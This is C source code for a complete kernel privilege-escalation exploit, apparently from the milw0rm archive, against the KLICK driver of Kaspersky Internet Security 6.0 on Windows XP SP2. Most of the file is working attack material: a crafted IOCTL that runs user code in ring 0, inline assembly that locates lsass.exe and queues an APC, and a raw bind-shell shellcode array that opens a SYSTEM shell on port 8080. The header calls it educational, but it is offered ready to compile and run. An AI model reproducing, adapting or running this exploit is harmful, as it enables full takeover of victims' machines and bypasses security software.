////////////////////////////////////
///// AVP (Kaspersky) 
////////////////////////////////////
//// FOR EDUCATIONAL PURPOSES ONLY
//// Kernel Privilege Escalation #2
//// Exploit
//// Rubén Santamarta 
//// www.reversemode.com
//// 01/09/2006
////
////
////Modify by Nanika
////naninb[at]gmail.com
////nanika[at]chroot.org
////Exploit Get SYSTEM SHELL PORT 8080
////WindowsXP Version SP2+ Kaspersky Internet Security 6.0.0.303
////Do not Enable Hardware DEP
////Reference:
////http://hitcon.org/download/2005/Windows_Kernel_Shellcode_Exploit.pdf
////http://research.eeye.com/html/Papers/download/StepIntoTheRing.pdf
////http://www.security.org.sg/code/sdtrestore.html
////http://www.reversemode.com/
////
////
////
////I AM NOT Japanese :P
////§Æ±æ¯àµ¹¤@¨Ç¬ã¨sKernel Exploitªº¤H¦³¤@¨ÇÀ°§U
////¤À¨É¬O¦³¯qªº
////////////////////////////////////
#define sysenter __asm __emit 0x0f __asm __emit 0x34



#include <windows.h>
#include <stdio.h>

#define STATUS_SUCCESS					((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH		((NTSTATUS)0xC0000004L)
#define OBJ_CASE_INSENSITIVE			0x00000040L
#define PAGE_READONLY					0x02
#define PAGE_READWRITE					0x04
#define DEF_KERNEL_BASE					0x80400000L
#define	SystemModuleInformation			11
#define PROT_MEMBASE					0x80000000

typedef LONG	NTSTATUS;
typedef struct _SYSTEM_MODULE_INFORMATION
{
	ULONG Reserved[2];
	PVOID Base;
	ULONG Size;
	ULONG Flags;
	USHORT Index;
	USHORT Unknown;
	USHORT LoadCount;
	USHORT ModuleNameOffset;
	CHAR ImageName[256];
} SYSTEM_MODULE_INFORMATION;

NTSTATUS (WINAPI * _NtQuerySystemInformation)(UINT, PVOID, ULONG, PULONG);


HINSTANCE base;

DWORD *kbase;
int *ExAllocatePool;
int *KeInitializeApc;
int *KeInsertQueueApc;
int *ZwYieldExecution;


unsigned char code[] =
//USER MODE Shellcode bind port 8080
//470bytes
"\x90\x90\x90\x90\x90"
"\x83\xec\x34\x8b\xf4\xe8\x47\x01\x00\x00\x89\x06\xff\x36\x68\x8e"
"\x4e\x0e\xec\xe8\x61\x01\x00\x00\x89\x46\x08\xff\x36\x68\xad\xd9"
"\x05\xce\xe8\x52\x01\x00\x00\x89\x46\x0c\x68\x6c\x6c\x00\x00\x68"
"\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x56\x08\x89\x46\x04"
"\xff\x36\x68\x72\xfe\xb3\x16\xe8\x2d\x01\x00\x00\x89\x46\x10\xff"
"\x36\x68\x7e\xd8\xe2\x73\xe8\x1e\x01\x00\x00\x89\x46\x14\xff\x76"
"\x04\x68\xcb\xed\xfc\x3b\xe8\x0e\x01\x00\x00\x89\x46\x18\xff\x76"
"\x04\x68\xd9\x09\xf5\xad\xe8\xfe\x00\x00\x00\x89\x46\x1c\xff\x76"
"\x04\x68\xa4\x1a\x70\xc7\xe8\xee\x00\x00\x00\x89\x46\x20\xff\x76"
"\x04\x68\xa4\xad\x2e\xe9\xe8\xde\x00\x00\x00\x89\x46\x24\xff\x76"
"\x04\x68\xe5\x49\x86\x49\xe8\xce\x00\x00\x00\x89\x46\x28\xff\x76"
"\x04\x68\xe7\x79\xc6\x79\xe8\xbe\x00\x00\x00\x89\x46\x2c\x33\xff"
"\x81\xec\x90\x01\x00\x00\x54\x68\x01\x01\x00\x00\xff\x56\x18\x50"
"\x50\x50\x50\x40\x50\x40\x50\xff\x56\x1c\x8b\xd8\x57\x57\x68\x02"
"\x00\x1f\x90\x8b\xcc\x6a\x16\x51\x53\xff\x56\x20\x57\x53\xff\x56"
"\x24\x57\x51\x53\xff\x56\x28\x8b\xd0\x68\x65\x78\x65\x00\x68\x63"
"\x6d\x64\x2e\x89\x66\x30\x83\xec\x54\x8d\x3c\x24\x33\xc0\x33\xc9"
"\x83\xc1\x15\xab\xe2\xfd\xc6\x44\x24\x10\x44\xfe\x44\x24\x3d\x89"
"\x54\x24\x48\x89\x54\x24\x4c\x89\x54\x24\x50\x8d\x44\x24\x10\x54"
"\x50\x51\x51\x51\x6a\x01\x51\x51\xff\x76\x30\x51\xff\x56\x10\x8b"
"\xcc\x6a\xff\xff\x31\xff\x56\x0c\x8b\xc8\x57\xff\x56\x2c\xff\x56"
"\x14\x55\x56\x64\xa1\x30\x00\x00\x00\x85\xc0\x78\x0c\x8b\x40\x0c"
"\x8b\x70\x1c\xad\x8b\x68\x08\xeb\x09\x8b\x40\x34\x8b\xa8\xb8\x00"
"\x00\x00\x8b\xc5\x5e\x5d\xc2\x04\x00\x53\x55\x56\x57\x8b\x6c\x24"
"\x18\x8b\x45\x3c\x8b\x54\x05\x78\x03\xd5\x8b\x4a\x18\x8b\x5a\x20"
"\x03\xdd\xe3\x32\x49\x8b\x34\x8b\x03\xf5\x33\xff\xfc\x33\xc0\xac"
"\x3a\xc4\x74\x07\xc1\xcf\x0d\x03\xf8\xeb\xf2\x3b\x7c\x24\x14\x75"
"\xe1\x8b\x5a\x24\x03\xdd\x66\x8b\x0c\x4b\x8b\x5a\x1c\x03\xdd\x8b"
"\x04\x8b\x03\xc5\xeb\x02\x33\xc0\x8b\xd5\x5f\x5e\x5d\x5b\xc2\x04"
"\x00";

void Ring0Function()
{
	/*
     printf("----[RING0]----\n");
     printf("Hello From Ring0!\n");
     printf("----[RING0]----\n\n");
	 WinExec("cmd.exe",SW_SHOW);
	 */
 __asm
    {
     nop
     nop
     nop
     nop
     nop
     nop
     nop
     nop

/*start here*/


    mov        eax,fs:[0x124]//TEB
    mov        esi,[eax+0x44]//EPROCESS
    mov        eax,esi

    
search:
    mov        eax,[eax+0x88]   //activeprocess
    sub        eax,0x88


   // cmp        dword ptr[eax+0x84],0x444//EPROCESS_PID
	cmp dword ptr[eax+0x174],'sasl'//FileName lsass.exe
    jne        search
   
   // mov        ebx,dword ptr[eax+0xc8]//system token
    mov  ebx,eax
    
   

	lea  esi,code//code

    mov ecx,0x1d6// code = 0x1d6

	mov dword ptr[edi],0xffdf0800//Kernel ffdf0000=user 7ffe0000
	push edi
	mov edi,[edi]
	rep movsb
	pop edi


    mov        ecx,dword ptr[ebx+0x190]
finddelay:
	mov ecx,[ecx]
    cmp byte ptr[ecx-0x1ff],0x5//1ff =ethread list - state 0x5=wait
	jnz finddelay
    sub ecx,0x22c
    mov ebp,ecx

	push 0x30//APC Object sizeof
	push 0 //Nonpage
	mov eax,ExAllocatePool//ExAllocatePool for APC Object
    call eax//call ExAllocatePool
    mov esi,eax
	xor edx,edx
	push edx//NULL
	push 01//UserMode
//	push dword ptr[edi]//user mode shellcode
    mov eax,0x7ffe0800//user mode shellcode
    push eax//User Mode routine
	push edx//NULL
	mov eax,ZwYieldExecution//0x804dd668//804dd237=kernel routine ret
	push eax//Kernel Mode routine
	push edx//NULL
	push ebp//ETHREAD
	push esi//APC object
	mov eax,KeInitializeApc  //initialize APC
	call eax


	xor ecx,ecx
	xor edx,edx
    xor eax,eax
    push eax
	push eax
	push ebp//ETHREAD
	push esi//APC Object
	mov eax,KeInsertQueueApc
	call eax

//    test eax,eax
//	jz recall

	mov byte ptr[ebp+0x4a],0x1

/*
	push 0x80000000
	push 0
	push 0
	mov eax,0x804dd4b8
	call eax
*/
/*
yeldloop:
	mov eax,0x804df4d5
	call eax
	jmp yeldloop
*/

    iretd
/*end here*/
     int 3
     NOP
     NOP
     NOP
     NOP
     NOP
     NOP
     NOP
     NOP
     
    }

     exit(1);
	 //printf("WindowsXP Version :P\n\n");
}
BOOL getNativeAPIs(void)
{
HMODULE hntdll;

hntdll = GetModuleHandle("ntdll.dll");

	*(FARPROC *)&_NtQuerySystemInformation =
		GetProcAddress(hntdll, "ZwQuerySystemInformation");

if(_NtQuerySystemInformation)
{
		return TRUE;
	}
	return FALSE;

}


DWORD getKernelBase(void)
{
	HANDLE hHeap = GetProcessHeap();
	
	NTSTATUS Status;
    ULONG cbBuffer = 0x8000;
    PVOID pBuffer = NULL;
	DWORD retVal = DEF_KERNEL_BASE;

    do
    {
		pBuffer = HeapAlloc(hHeap, 0, cbBuffer);
		if (pBuffer == NULL)
			return DEF_KERNEL_BASE;

		Status = _NtQuerySystemInformation(SystemModuleInformation,
					pBuffer, cbBuffer, NULL);

		if(Status == STATUS_INFO_LENGTH_MISMATCH)
		{
			HeapFree(hHeap, 0, pBuffer);
			cbBuffer *= 2;
		}
		else if(Status != STATUS_SUCCESS)
		{
			HeapFree(hHeap, 0, pBuffer);
			return DEF_KERNEL_BASE;
		}
    }
    while (Status == STATUS_INFO_LENGTH_MISMATCH);

	DWORD numEntries = *((DWORD *)pBuffer);
	SYSTEM_MODULE_INFORMATION *smi = (SYSTEM_MODULE_INFORMATION *)((char *)pBuffer + sizeof(DWORD));

	for(DWORD i = 0; i < numEntries; i++)
	{
		if(strcmpi(smi->ImageName, "ntoskrnl.exe"))
		{
			printf("%.8X - %s\n", smi->Base, smi->ImageName);
			retVal = (DWORD)(smi->Base);
			break;
		}
		smi++;
	}

	HeapFree(hHeap, 0, pBuffer);

	return retVal;
}
VOID ShowError()
{
 LPVOID lpMsgBuf;
 FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER| FORMAT_MESSAGE_FROM_SYSTEM,
               NULL,
               GetLastError(),
               MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
               (LPTSTR) &lpMsgBuf,
               0,
               NULL);
 MessageBoxA(0,(LPTSTR)lpMsgBuf,"Error",0);
 exit(1);
}

int main(int argc, char *argv[])
{

 DWORD				InBuff[1];			
 DWORD				dwIOCTL,OutSize,InSize,junk;
 HANDLE				hDevice;
 OSVERSIONINFO ov;

system("cls");
printf("#######################\n");
printf("## AVP Ring0 Exploit ##\n");
printf("#######################\n");
printf("Ruben Santamarta\nwww.reversemode.com\n\n");
printf("Modify by Nanika\n\n");
printf("naninb[at]gmail.com\n");
printf("www.chroot.org\n");
printf("WindowsXP Version SP2+ Kaspersky Internet Security 6.0.0.303 :P\n");



	ov.dwOSVersionInfoSize = sizeof(ov);
	GetVersionEx(&ov);
	if(ov.dwMajorVersion != 5)
	{
		printf("Sorry, this version supports only WinXP.\n");
		return 1;
	}

	if(ov.dwMinorVersion != 1)
	{
		printf("Sorry, this version supports only WinXP.\n");
		return 1;
	}
getNativeAPIs();

kbase=(unsigned long *)getKernelBase();
base=LoadLibrary("ntoskrnl.exe");

ExAllocatePool=(int *)GetProcAddress(base,"ExAllocatePool");
KeInitializeApc=(int *)GetProcAddress(base,"KeInitializeApc");
KeInsertQueueApc=(int *)GetProcAddress(base,"KeInsertQueueApc");
ZwYieldExecution=(int *)GetProcAddress(base,"ZwYieldExecution");
ExAllocatePool=(int *)((int *)ExAllocatePool - (int *)base+(int *)kbase);
KeInitializeApc=(int *)((int *)KeInitializeApc-(int *)base+(int *)kbase);
KeInsertQueueApc=(int *)((int *)KeInsertQueueApc-(int *)base+(int *)kbase);
ZwYieldExecution=(int *)((int *)ZwYieldExecution-(int *)base+(int *)kbase);
FreeLibrary(base);

hDevice = CreateFile("\\\\.\\KLICK",
                     0,
                     0,
                     NULL,
                     3,
                     0,
                     0);

//////////////////////
///// INFO 
//////////////////////

 if (hDevice == INVALID_HANDLE_VALUE) ShowError();
 printf("[!] KLICK Device Handle [%x]\n",hDevice);


 
//////////////////////
///// BUFFERS
//////////////////////
 InSize = 0x8;

 
 InBuff[0] =(DWORD) Ring0Function;  // Ring0 ShellCode Address
 
 //////////////////////
 ///// IOCTL
 //////////////////////

 dwIOCTL = 0x80052110;

 printf("[!] IOCTL [0x%x]\n\n",dwIOCTL);
 printf("Exploit TEST!!!!!!!!!!\n\n");
 printf("Telnet x.x.x.x 8080 get SYSTEM shell!!!!!!!!  :P\n\n");
 DeviceIoControl(hDevice, 
                 dwIOCTL, 
                 InBuff,0x8,
                 (LPVOID)NULL,0,
                 &junk,  
                 NULL);


 
}

// milw0rm.com [2006-10-29]
